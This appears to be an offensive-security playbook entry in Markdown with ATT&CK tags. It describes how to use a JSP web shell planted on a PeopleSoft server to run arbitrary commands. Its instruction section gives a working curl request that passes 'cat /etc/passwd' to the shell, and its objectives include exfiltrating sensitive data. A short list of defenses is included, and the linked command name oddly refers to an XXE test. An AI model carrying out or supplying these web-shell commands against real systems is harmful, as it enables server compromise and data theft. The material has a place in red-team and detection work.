---
tags:
  - rce
  - web-shell
type: procedure
tools:
  - '[[tools/curl]]'
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-post-xxe-test]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unix Shell]]'
  - '[[Web Shell]]'
updated_at: '2025-12-14T17:24:07.965Z'
sub_techniques: []
id: 0771306b-2503-4301-b970-3da49dacef66
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Unix Shell]]'
  - '[[Web Shell]]'
---
# Access-JSP-Shell-for-RCE

## Summary

This procedure accesses the deployed JSP shell via HTTP GET with a command parameter to execute arbitrary system commands, achieving full RCE on the server.

## Description

The JSP shell, when requested with ?c=<command>, uses Java's Runtime.exec to run the command and streams output. This demonstrates control, e.g., reading /etc/passwd, on the Linux server hosting PeopleSoft.

## Requirements

1. JSP shell deployed to /PSIGW/PVrIiSDNAQlOQubhYHDE.jsp
2. HTTP access to the endpoint
3. Encoded command parameters

## Defense

Defensive measures and detection strategies:

- Remove or quarantine suspicious JSP files in webroots
- Implement runtime application self-protection (RASP) to detect exec calls
- Log and alert on unusual HTTP parameters and command outputs

## Objectives

1. Execute system commands remotely
2. Confirm server compromise
3. Exfiltrate sensitive data

## Instructions

### Step 1: Trigger Shell Execution

**Context**: GET the JSP with encoded command to run cat /etc/passwd.

**Command** ([[commands/curl-post-xxe-test]]):
```bash
curl -k "https://target/PSIGW/PVrIiSDNAQlOQubhYHDE.jsp?c=cat%20/etc/passwd"
```

> Expected: Contents of /etc/passwd printed, confirming RCE.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Unix Shell]]
- [[Web Shell]]

### Sub-Techniques


## Commands Used

- [[commands/curl-post-xxe-test]]

## Tools Used

- [[tools/curl]]
- [[tools/Burp-Suite]]

## Tags

- [[rce]]
- [[web-shell]]
